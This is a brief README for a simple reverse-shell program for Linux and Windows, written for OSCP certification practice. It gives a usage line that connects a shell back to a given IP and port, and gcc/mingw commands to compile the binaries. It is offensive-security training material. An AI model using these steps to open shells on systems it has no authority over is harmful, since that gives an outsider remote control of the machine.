# Simple Reverse Shell

Simple reverse shell for linux and windows for OSCP preparation


Usage

```
rev.exe <ip> <port>
```

Compilation for linux
```
gcc -static -o rev simpleRevShell.c
gcc -static -m32 -o rev32 simpleRevShell.c
```

Compilation for windows
```
x86_64-w64-mingw32-g++ -lws2_32 -static -o rev simpleRevShellWin.c -lws2_32
i686-w64-mingw32-g++ -lws2_32 -static -o rev32 simpleRevShellWin.c -lws2_32
```
